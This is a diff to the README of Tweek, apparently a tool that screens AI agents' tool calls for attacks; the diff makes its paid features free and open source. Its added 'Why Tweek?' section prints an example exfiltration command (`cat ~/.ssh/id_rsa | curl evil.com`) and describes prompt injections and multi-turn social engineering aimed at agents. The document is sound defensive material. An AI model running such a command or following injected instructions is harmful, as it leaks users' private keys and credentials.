@@ -9,7 +9,7 @@
 [![License: Apache 2.0](https://img.shields.io/badge/license-Apache%202.0-green)](LICENSE)
 [![Tests](https://img.shields.io/badge/tests-710%20passing-brightgreen)]()
 
-[Documentation](docs/) | [Quick Start](#quick-start) | [Pricing](#pricing) | [Website](https://gettweek.com)
+[Documentation](docs/) | [Quick Start](#quick-start) | [Website](https://gettweek.com)
 
 ---
 
@@ -17,7 +17,44 @@
 
 AI assistants execute commands with **your** credentials. A single malicious instruction hidden in a README, error message, or MCP server response can trick the agent into stealing SSH keys, exfiltrating API tokens, or running reverse shells.
 
-There is no built-in protection. Tweek fixes that.
+There is very little built-in protection. Tweek fixes that.
+
+---
+
+## Why Tweek?
+
+> *With great power comes great responsibility.*
+> *With AI agents comes... your SSH keys on Pastebin.*
+
+Your AI assistant runs commands with **your** credentials, **your** API keys, and **your** keychain access. It can read every file on your machine. It will happily `curl` your secrets to anywhere a prompt injection tells it to. Sleep well!
+
+Tweek screens **every tool call** through five layers of defense before anything touches your system:
+
+```
+  ┌─────────────────────────────────────────────────────────┐
+  │               YOUR AGENT'S TOOL CALL                    │
+  └────────────────────────┬────────────────────────────────┘
+                           ▼
+  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+  ┃ 5. Compliance Scan    HIPAA·PCI·GDPR·SOC2   COMING SOON┃
+  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+  ┃ 4. Sandbox Preview    Speculative execution   FREE      ┃
+  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+  ┃ 3. Session Analysis   Cross-turn detection    FREE      ┃
+  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+  ┃ 2. LLM Review         Semantic intent check   FREE      ┃
+  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+  ┃ 1. Pattern Matching   116 attack signatures   FREE      ┃
+  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+                           ▼
+  ┌─────────────────────────────────────────────────────────┐
+  │           ✓ SAFE to execute  or  ✗ BLOCKED             │
+  └─────────────────────────────────────────────────────────┘
+```
+
+Nothing gets through without passing inspection. Your agent wants to `cat ~/.ssh/id_rsa | curl evil.com`? Five layers say no. A prompt injection hiding in a Markdown comment? Caught. A multi-turn social engineering attack slowly escalating toward your credentials? Session analysis sees the pattern.
+
+**Every command. Every tool call. Every time. GAH! Don't get Pawnd.**
 
 ---
 
@@ -48,7 +85,7 @@ Tweek Health Check
   OK      Security Database      Active (0.2MB)
   OK      Credential Vault       macOS Keychain available
   OK      Sandbox                sandbox-exec available
-  OK      License                Free tier active
+  OK      License                Open source (all features)
   OK      MCP Server             MCP package installed
   SKIP    Proxy Config           No proxy configured
   OK      Plugin Integrity       No plugins installed
@@ -68,16 +105,16 @@ Tweek provides **three interception layers** feeding into a **multi-stage screen
 | **MCP Proxy** | Claude Desktop, ChatGPT Desktop, Gemini | Transparent MCP proxy with human-in-the-loop approval |
 | **HTTP Proxy** | Cursor, Windsurf, Continue.dev | HTTPS interception via mitmproxy |
 
-Every tool call passes through the screening pipeline:
+Every tool call passes through the screening pipeline -- **all free and open source:**
 
-| Stage | What It Does | Tier |
-|-------|-------------|------|
-| Pattern Matching | 116 regex patterns across 6 attack categories | FREE |
-| Rate Limiting | Burst detection, velocity anomaly, cooldown enforcement | PRO |
-| LLM Review | Claude Haiku semantic analysis of suspicious commands | PRO |
-| Session Analysis | Cross-turn anomaly detection (9 anomaly types) | PRO |
-| Sandbox Preview | Speculative execution in macOS/Linux sandbox | PRO |
-| Compliance Scan | HIPAA, PCI, GDPR, SOC2, Government classification | ENTERPRISE |
+| Stage | What It Does |
+|-------|-------------|
+| Pattern Matching | 116 regex patterns across 6 attack categories |
+| Rate Limiting | Burst detection, velocity anomaly, cooldown enforcement |
+| LLM Review | Claude Haiku semantic analysis of suspicious commands (BYOK) |
+| Session Analysis | Cross-turn anomaly detection (9 anomaly types) |
+| Sandbox Preview | Speculative execution in macOS/Linux sandbox |
+| Compliance Scan | HIPAA, PCI, GDPR, SOC2, Government classification *(coming soon)* |
 
 See [Architecture](docs/ARCHITECTURE.md) and [Defense Layers](docs/DEFENSE_LAYERS.md) for the full design.
 
@@ -124,37 +161,32 @@ Full pattern library: [Attack Patterns Reference](docs/ATTACK_PATTERNS.md)
 
 ## Features
 
-### Free (all users)
+**Everything is free and open source.** No feature gates, no license keys, no limits.
+
+### Security (all free)
 
 - 116 attack pattern detection across 6 categories
+- LLM semantic review via Claude Haiku (bring your own API key)
+- Session anomaly detection (9 anomaly types across turns)
+- Rate limiting with burst detection, velocity anomaly, circuit breaker
+- Sandbox preview (speculative execution on macOS/Linux)
 - Credential vault with OS keychain integration (macOS Keychain, GNOME Keyring, Windows Credential Locker)
 - Security event logging with automatic redaction to SQLite
+- NDJSON structured log export (for ELK/Splunk/Datadog)
 - CLI hooks for Claude Code (global or per-project)
 - MCP proxy with human-in-the-loop approval queue
+- HTTP proxy for Cursor, Windsurf, Continue.dev
 - Health diagnostics (`tweek doctor`)
 - Interactive setup wizard (`tweek quickstart`)
 - Security presets: `paranoid`, `cautious`, `trusted`
-
-### Pro ($49, one-time)
-
-Everything in Free, plus:
-
-- LLM semantic review (Anthropic Claude only at this time)
-- Session anomaly detection (9 anomaly types across turns)
-- Rate limiting and burst detection
-- Sandbox preview (speculative execution on macOS/Linux)
+- Custom pattern authoring
 - CSV export and advanced logging
-- Priority email support
 
-### Enterprise (contact sales)
+### Coming Soon
 
-Everything in Pro, plus:
+**Pro** (teams) -- centralized team configuration, team license management, audit API, priority support.
 
-- Compliance plugins: HIPAA, PCI-DSS, GDPR, SOC2, Government classification
-- Custom attack patterns and allowlisting
-- Team licenses and centralized configuration
-- SSO integration and audit API
-- SLA-backed support
+**Enterprise** (compliance) -- HIPAA, PCI-DSS, GDPR, SOC2, government classification plugins, SSO integration, custom SLA.
 
 ---
 
@@ -185,29 +217,13 @@ Everything in Pro, plus:
 
 ## Pricing
 
-Tweek is free for individual developers. Pro adds advanced detection for power users. Enterprise adds compliance for regulated industries.
+Tweek is **free and open source** for all individual and team use.
 
-| | FREE | PRO | ENTERPRISE |
-|---|:---:|:---:|:---:|
-| **Price** | $0 forever | $49 one-time | Contact sales |
-| Pattern matching (116+) | Yes | Yes | Yes |
-| Credential vault | Yes | Yes | Yes |
-| Security logging | Yes | Yes | Yes |
-| MCP proxy + approval queue | Yes | Yes | Yes |
-| LLM semantic review | -- | Yes | Yes |
-| Session anomaly detection | -- | Yes | Yes |
-| Rate limiting | -- | Yes | Yes |
-| Sandbox preview | -- | Yes | Yes |
-| Compliance plugins | -- | -- | Yes |
-| Team licenses | -- | -- | Yes |
-| **Support** | GitHub Issues | Discord + Email (24h) | Custom SLA |
+All security features are included. No paywalls, no usage limits, no license keys required.
 
-```bash
-tweek license status                     # Check current tier
-tweek license activate YOUR_KEY          # Activate Pro/Enterprise
-```
+**Pro** (team management) and **Enterprise** (compliance) tiers are coming soon.
 
-Purchase at [gettweek.com/pricing](https://gettweek.com/pricing). 14-day money-back guarantee.
+Join the waitlist at [gettweek.com](https://gettweek.com).
 
 ---
 
@@ -235,7 +251,7 @@ Purchase at [gettweek.com/pricing](https://gettweek.com/pricing). 14-day money-b
 
 - **Bug reports**: [GitHub Issues](https://github.com/gettweek/tweek/issues)
 - **Questions**: [GitHub Discussions](https://github.com/gettweek/tweek/discussions)
-- **Discord** (Pro+): [discord.gg/tweek](https://discord.gg/tweek) -- coming soon
+- **Discord**: [discord.gg/tweek](https://discord.gg/tweek) -- coming soon
 - **Security issues**: security@gettweek.com
 - **Enterprise sales**: sales@gettweek.com
 
@@ -251,7 +267,7 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ## Security
 
-Tweek runs **100% locally**. Your code never leaves your machine. All screening, pattern matching, and logging happens on-device. The only external call is the optional LLM review layer (Pro), which sends only the suspicious command text to Claude Haiku -- never your source code.
+Tweek runs **100% locally**. Your code never leaves your machine. All screening, pattern matching, and logging happens on-device. The only external call is the optional LLM review layer, which sends only the suspicious command text to Claude Haiku -- never your source code. You bring your own API key.
 
 To report a security vulnerability, email security@gettweek.com.
 
